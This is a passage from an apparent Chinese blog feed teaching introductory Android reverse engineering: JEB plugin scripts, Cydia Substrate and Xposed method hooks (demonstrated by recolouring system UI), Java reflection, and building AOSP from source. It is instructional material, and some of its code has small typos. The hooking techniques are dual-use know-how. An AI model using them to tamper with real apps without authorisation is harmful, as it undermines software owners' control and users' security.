      &lt;p&gt;Android 加壳和脱壳入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向入门（三）</title>
    <link href="blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>blog.b3ale.cn/2020/02/12/Android%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2020-02-12T06:06:59.000Z</published>
    <updated>2020-02-19T09:06:39.439Z</updated>
    
    <content type="html"><![CDATA[<p>记录 Jeb 插件编写、简单 Hook 以及 Android 系统结构简述。</p><a id="more"></a><h1 id="JEB-插件扩展"><a href="#JEB-插件扩展" class="headerlink" title="JEB 插件扩展"></a>JEB 插件扩展</h1><h2 id="插件帮助文件"><a href="#插件帮助文件" class="headerlink" title="插件帮助文件"></a>插件帮助文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$JEB/doc/apidoc</span><br></pre></td></tr></table></figure><h2 id="插件编写"><a href="#插件编写" class="headerlink" title="插件编写"></a>插件编写</h2><p>语言：Java/Python</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jeb.api.IScript;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">decJebString</span> <span class="title">implemants</span> <span class="title">IScript</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> JebInstance jeb = <span class="keyword">null</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(JebInstance jebInstance)</span> </span>&#123;</span><br><span class="line">        jeb = jebInstance;</span><br><span class="line">        jeb.print(<span class="string">"Hello World!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强制反编译结果，相当于 Ctrl+F5：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jeb.api.IScript;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">decJebString</span> <span class="title">implemants</span> <span class="title">IScript</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String targetSignature = <span class="string">"Lcom/pnfsoftware/jebglobal/decStr;-&gt;decodeString([BII)Ljava/lang/String;"</span>;</span><br><span class="line">    <span class="keyword">private</span> JebInstance jeb = <span class="keyword">null</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(JebInstance jebInstance)</span> </span>&#123;</span><br><span class="line">        jeb = jebInstance;</span><br><span class="line">        Dex dex = jeb.getDex();</span><br><span class="line">        List&lt;String&gt; classSignatures = dex.getClassSignatures(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">int</span> methodCount = dex.getMethodCount();</span><br><span class="line">        String methodSig;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodCount; i++) &#123;</span><br><span class="line">            DexMethod dexMethod = dex.getMethod(i);</span><br><span class="line">            <span class="keyword">int</span> idx = dexMethod.getIndex();</span><br><span class="line">            methodSig = dexMethod.getSignature(<span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(methodSig.equals(targetSignature)) &#123;</span><br><span class="line">                List&lt;Integer&gt; methodReferences = dex.getMethodReferences(idx); <span class="comment">// 获取交叉引用</span></span><br><span class="line">                <span class="keyword">for</span>(Integer refIdx : methodReferences) &#123;</span><br><span class="line">                    DexMethod refDexMethod = dex.getMethod(refIdx);</span><br><span class="line">                    jeb.decompileMethod(refDexMethod.getSignature(<span class="keyword">true</span>));</span><br><span class="line">                    ...</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Android-快速定位关键代码"><a href="#Android-快速定位关键代码" class="headerlink" title="Android 快速定位关键代码"></a>Android 快速定位关键代码</h1><ul><li>字符串、特征字</li><li>关键 API 监控</li><li>Hook 解密函数</li><li>Monitor</li><li>插 Log 信息<ul><li><code>invoke-static {v0}, Lcom/android/killer/Log;-&gt;LogStr(Ljava/lang/String;)V</code></li></ul></li><li>动态调试</li></ul><h1 id="快速-Hook-代码"><a href="#快速-Hook-代码" class="headerlink" title="快速 Hook 代码"></a>快速 Hook 代码</h1><p>对函数进行挂钩，可以影响整个函数的执行。挂钩后，注入的代码可以接管整个函数，修改函数的参数，返回值，甚至整个函数的行为等。</p><h2 id="Cydia-Substrate"><a href="#Cydia-Substrate" class="headerlink" title="Cydia Substrate"></a><a href="http://www.cydiasubstrate.com/" target="_blank" rel="noopener">Cydia Substrate</a></h2><p>只要知道类名就可以 Hook，而且属于系统全局属性，软件基本上不能检测到。</p><h3 id="Hook-Java"><a href="#Hook-Java" class="headerlink" title="Hook Java"></a>Hook Java</h3><ol><li>新建空项目</li><li>导入 lib 文件 substrate-api.jar</li><li>修改 AndroidManifest.xml 文件</li><li>编写入口类</li><li>安装激活插件，重启后可以看到插件效果</li></ol><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>修改 AndroidManifest.xml 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"com.saurik.substrate.main"</span> <span class="attr">android:value</span>=<span class="string">"com.assassinq.cydiajavahook.CydiaMain"</span>/&gt;</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"cydia.permission.SUBSTRATE"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写入口类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.assassinq.cydiajavahook;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.saurik.substrate.MS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CydiaMain</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        MS.hookClassLoad(<span class="string">"android.content.res.Resources"</span>, <span class="keyword">new</span> MS.ClassLoadHook() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">classLoaded</span><span class="params">(Class&lt;?&gt; resources)</span> </span>&#123;</span><br><span class="line">                Method getColor;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    getColor = resources.getDeclaredMethod(<span class="string">"getColor"</span>, Integer.TYPE);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    getColor = <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (getColor != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">final</span> MS.MethodPointer old = <span class="keyword">new</span> MS.MethodPointer();</span><br><span class="line">                    MS.hookMethod(resources, getColor, <span class="keyword">new</span> MS.MethodHook() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="function"><span class="keyword">public</span> Object <span class="title">invoked</span><span class="params">(Object res, Object... args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                            <span class="keyword">int</span> color = (Integer) old.invoke(res, args);</span><br><span class="line">                            <span class="keyword">return</span> color &amp; ~<span class="number">0xFFFFFF</span> | <span class="number">0x00AAAA</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;, old);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写完成后，将程序安装到手机上，会弹出 Substrate extentions updated：</p><p><img src="/pics/Android逆向入门/三/1.png" alt></p><p>点击进入 Cydia Substrate，点击 Restart System (Soft) 来重启系统：</p><p><img src="/pics/Android逆向入门/三/2.png" alt></p><p>重启后发现系统某些部分的颜色已经被我们 Hook 成了其他颜色：</p><p><img src="/pics/Android逆向入门/三/3.png" alt></p><p>在设置中打开更加明显：</p><p><img src="/pics/Android逆向入门/三/4.png" alt></p><h4 id="Java-反射"><a href="#Java-反射" class="headerlink" title="Java 反射"></a>Java 反射</h4><p>Java 可以通过反射方法去获取类以及它的成员。反射相当于提供一些函数，让我们在不知道原始累的定义的情况下，去修改类中相关的成员的属性、值等。</p><p>所有类都是继承自 Object 类的，所以都可以使用 Object 的方法。也可以强制转换为 Object。所有，遇到无法表示出来的对象时，直接用 Object 即可。</p><p>获取对象的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Object obj = <span class="string">"123"</span>;</span><br><span class="line">Class clazz = obj.getClass();</span><br></pre></td></tr></table></figure><p>获取类中的方法（使用对应的不是以 s 为后缀的函数可以获取特定的函数或 field）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Method[] mPubMethods = clazz.getMethods(); <span class="comment">// 获取公有可直接调用的方法</span></span><br><span class="line">Method[] mDeclareMethods = clazz.getDeclareMethods(); <span class="comment">// 获取类中声明的所有方法</span></span><br><span class="line">Field[] mPubFields = clazz.getFields(); <span class="comment">// 获取public的field</span></span><br><span class="line">Field[] mDeclareFields = clazz.getDeclaredFields(); <span class="comment">// 获取声明的所有field</span></span><br></pre></td></tr></table></figure><p>方法调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(obj, arg)</span><br></pre></td></tr></table></figure><p>域操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">field.set(obj, <span class="string">"1"</span>);</span><br><span class="line">field.get(obj);</span><br></pre></td></tr></table></figure><p>访问权限设置（域与方法都一样，控制是否可以直接访问，其实就是相当于 public 属性）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">field.isAccessible();</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>其余的函数，可以获取函数的名称，还有其他种种信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">field.getName();</span><br><span class="line">field.toString();</span><br><span class="line">Class.forName(<span class="string">"android.view.Menu"</span>); <span class="comment">// 寻找类，必须是一个classloader下的才能使用</span></span><br></pre></td></tr></table></figure><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>Xposed 是在程序启动的时候同时加载的，因此他的 Hook 是区分进程的。对于程序的类和参数可以通过名字来进行 Hook。Xposed 的 Hook 分为函数执行前和执行后两个位置，可以分别进行参数修改和结果修改。如果不想进行调用的话，可以在执行前使用 <code>setResult(NULL)</code> 函数。比起 Cydia 使用范围更加广泛，各种插件都是基于 Xposed 的，并且是开源的。</p><ol><li>新建基础项目</li><li>导入 lib 文件 XposedBridgeApi-54.jar（compileOnly 模式，也就是不参与编译到最终文件中）</li><li>修改 AndroidManifest.xml 文件</li><li>入口类编写</li><li>设置启动入口：在 assets 文件夹中，新建 xposed_init 文件，写入入口类的信息 com.assassinq.xposedjavahook.XposedMain</li><li>安装激活插件，重启后可以看到插件效果</li></ol><p>修改 app 下的 build.gradle 文件，将对应 lib/XposedBridgeApi-54.jar 的操作 implementation 修改成 compileOnly：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    compileOnly files(<span class="string">'lib/XposedBridgeApi-54.jar'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook-Java-1"><a href="#Hook-Java-1" class="headerlink" title="Hook Java"></a>Hook Java</h3><p>修改 AndroidManifest.xml 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span> <span class="attr">android:value</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span> <span class="attr">android:value</span>=<span class="string">"Hook getColor"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span> <span class="attr">android:value</span>=<span class="string">"54"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.READ_PHONE_STATE"</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>入口类编写，新建一个类文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XposedMain</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"><span class="comment">//        if (param.packageName.equals("apk")) &#123;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                findAndHookMethod(<span class="string">"android.content.res.Resources"</span>, param.classLoader, <span class="string">"getColor"</span>, <span class="keyword">int</span>.class, <span class="keyword">new</span> myGetColor());</span><br><span class="line"><span class="comment">//                waitForDebugger();</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                XposedBridge.log(e);</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myGetColor</span> <span class="keyword">extends</span> <span class="title">XC_MethodHook</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Log.d(<span class="string">"DEBUG"</span>, <span class="string">"Before Method Hook"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        Log.d(<span class="string">"DEBUG"</span>, <span class="string">"After Method Hook"</span>);</span><br><span class="line">        <span class="keyword">int</span> res = (<span class="keyword">int</span>) param.getResult();s</span><br><span class="line">        res = res &amp; ~<span class="number">0xFFFFFF</span> | <span class="number">0x00AAAA</span>;</span><br><span class="line">        param.setResult(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样，编写完成后会弹出一个 Xposed module is not activated：</p><p><img src="/pics/Android逆向入门/三/5.png" alt></p><p>点击后勾选我们编写的模块，并在 Framework 界面点击 Soft Reboot 以激活插件：</p><p><img src="/pics/Android逆向入门/三/6.png" alt></p><p>重启后系统部分颜色同样被改变，但效果没有 Cydia 的好：</p><p><img src="/pics/Android逆向入门/三/7.png" alt></p><h3 id="classLoader"><a href="#classLoader" class="headerlink" title="classLoader"></a>classLoader</h3><p>与 Java 上的类似，就是一个类装载器。与 Java 不同的是，classLoader 所加载的就是 dex 文件本身。所以通过程序的 classLoader，可以取得程序的 dex 中所定义的所有类及其成员函数。同理，如果一个程序有多个 dex，那么会对应着多个 classLoader，特别是使用动态加载的 dex，则需要传递想要的 classLoader 才可以进行数据获取。</p><h1 id="Android-源码浅析"><a href="#Android-源码浅析" class="headerlink" title="Android 源码浅析"></a>Android 源码浅析</h1><h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><p>Ubuntu 14.04</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>首先搭建好 JDK 6 的环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &amp;&amp; wget https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-linux-x64.bin</span><br><span class="line">chmod +x jdk-6u45-linux-x64.bin &amp;&amp; ./jdk-6u45-linux-x64.bin</span><br><span class="line"><span class="built_in">cd</span> /usr &amp;&amp; sudo mkdir java</span><br><span class="line"><span class="built_in">cd</span> java &amp;&amp; sudo mv ~/jdk1.6.0_45 .</span><br><span class="line">vim ~/.bashrc</span><br><span class="line"><span class="comment"># export JAVA_HOME="/usr/java/jdk1.6.0_45"</span></span><br><span class="line"><span class="comment"># export JRE_HOME="$JAVA_HOME/jre"</span></span><br><span class="line"><span class="comment"># export CLASSPATH="$CLASSPATH:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar"</span></span><br><span class="line"><span class="comment"># export PATH="$PATH:$JAVA_HOME/bin"</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure><p>然后安装一些编译时需要用到的依赖文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install git-core gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libgl1-mesa-dev libxml2-utils xsltproc unzip</span><br></pre></td></tr></table></figure><p>添加 51-android.rules，使得手机 USB 连接到 Ubuntu 能够被识别：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &amp;&amp; wget https://raw.githubusercontent.com/M0Rf30/android-udev-rules/master/51-android.rules</span><br><span class="line">sudo mv 51-android.rules /etc/udev/rules.d/</span><br><span class="line">sudo udevadm control --reload-rules</span><br></pre></td></tr></table></figure><p>接下来使用 repo 工具同步下载 Android 源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &amp;&amp; mkdir bin <span class="comment"># export PATH="$HOME/bin:$PATH"</span></span><br><span class="line">curl https://mirrors.tuna.tsinghua.edu.cn/git/git-repo &gt; ~/bin/repo</span><br><span class="line"><span class="comment"># curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span></span><br><span class="line">chmod a+x ~/bin/repo</span><br><span class="line"><span class="built_in">export</span> WORKING_DIRECTORY=<span class="string">"android-4.4.3_r1"</span></span><br><span class="line">mkdir <span class="variable">$WORKING_DIRECTORY</span> &amp;&amp; <span class="built_in">cd</span> <span class="variable">$WORKING_DIRECTORY</span></span><br><span class="line">git config --global user.name <span class="string">"Your Name"</span></span><br><span class="line">git config --global user.email <span class="string">"your@example.com"</span></span><br><span class="line"><span class="comment"># export REPO_URL="https://aosp.tuna.tsinghua.edu.cn/android/git-repo"</span></span><br><span class="line"><span class="comment"># vim ~/bin/repo # REPO_URL = 'https://aosp.tuna.tsinghua.edu.cn/android/git-repo'</span></span><br><span class="line">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-4.4.3_r1</span><br><span class="line"><span class="comment"># repo init -u https://android.googlesource.com/platform/manifest -b android-4.4.3_r1</span></span><br><span class="line">repo sync <span class="comment"># Takes a very long time</span></span><br><span class="line"><span class="comment"># repo sync -c --no-clone-bundle --no-tags --prune -j4</span></span><br></pre></td></tr></table></figure><p>同步完成后进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh <span class="comment"># Setup environment</span></span><br><span class="line">lunch aosp_arm-eng <span class="comment"># Setup choices</span></span><br><span class="line"><span class="built_in">export</span> USE_CCACHE=1 <span class="comment"># Enable ccache</span></span><br><span class="line">prebuilts/misc/linux-x86/ccache/ccache -M 100G <span class="comment"># Set ccache memory = 100G</span></span><br><span class="line"><span class="comment"># export CCACHE_DIR=$YOUR_PATH/.ccache # Set ccache dir # Default in $HOME/.ccache</span></span><br><span class="line">make -j4</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>安装一下 Android Studio，用来作为查看源码的编辑器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386 lib32z1 libbz2-1.0:i386</span><br><span class="line">wget https://dl.google.com/dl/android/studio/ide-zips/3.5.3.0/android-studio-ide-191.6010548-linux.tar.gz</span><br><span class="line">tar zxvf android-studio-ide-191.6010548-linux.tar.gz</span><br><span class="line">sudo mv android-studio /usr/<span class="built_in">local</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/android-studio/bin</span><br><span class="line">./studio.sh</span><br></pre></td></tr></table></figure><p>PS：<a href="https://www.v2ex.com/t/455266" target="_blank" rel="noopener">谷歌在国内有服务器，用 ping.chinaz.com 解析出 dl.google.com 最快的 ip，在 hosts 里写死就行了，直接满速下载。</a></p><p>生成 Android Studio 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/<span class="variable">$WORKING_DIRECTORY</span> &amp;&amp; <span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch aosp_arm-eng</span><br><span class="line"><span class="built_in">cd</span> development/tools/idegen &amp;&amp; mm</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span>/<span class="variable">$WORKING_DIRECTORY</span> &amp;&amp; ./development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure><p>运行完后，将根目录下的 android.ipr 导入 Android Studio 即可。目录结构：</p><table><thead><tr><th style="text-align:center">文件夹/文件</th><th style="text-align:center">包含内容</th></tr></thead><tbody><tr><td style="text-align:center">abi</td></tr><tr><td style="text-align:center">art</td><td style="text-align:center">art 模式相关的代码</td></tr><tr><td style="text-align:center">bionic</td><td style="text-align:center">各种 so 库的源代码</td></tr><tr><td style="text-align:center">bootable</td><td style="text-align:center">recovery、bootloader、diskinstaller</td></tr><tr><td style="text-align:center">build</td><td style="text-align:center">源码编译生成的规则代码</td></tr><tr><td style="text-align:center">cts</td><td style="text-align:center">Android 兼容性测试套件标准</td></tr><tr><td style="text-align:center">dalvik</td><td style="text-align:center">Dalvik 模式相关的代码</td></tr><tr><td style="text-align:center">developers</td><td style="text-align:center">一些开发上用来参考的资料</td></tr><tr><td style="text-align:center">development</td><td style="text-align:center">Android 开发相关的代码，makekey 等</td></tr><tr><td style="text-align:center">device</td><td style="text-align:center">手机驱动的源码</td></tr><tr><td style="text-align:center">docs</td><td style="text-align:center">doc 文档</td></tr><tr><td style="text-align:center">external</td><td style="text-align:center">Android 使用的一些开源的模块</td></tr><tr><td style="text-align:center">frameworks</td><td style="text-align:center">框架</td></tr><tr><td style="text-align:center">hardware</td><td style="text-align:center">部分开源的 HAL 代码</td></tr><tr><td style="text-align:center">libcore</td><td style="text-align:center">一些核心的 lib 文件库</td></tr><tr><td style="text-align:center">libnativehelper</td><td style="text-align:center">jni 相关的代码，包括如何通过 jni 来获取 Dalvik 中的某些函数</td></tr><tr><td style="text-align:center">Makefile</td></tr><tr><td style="text-align:center">ndk</td><td style="text-align:center">ndk 代码</td></tr><tr><td style="text-align:center">out</td></tr><tr><td 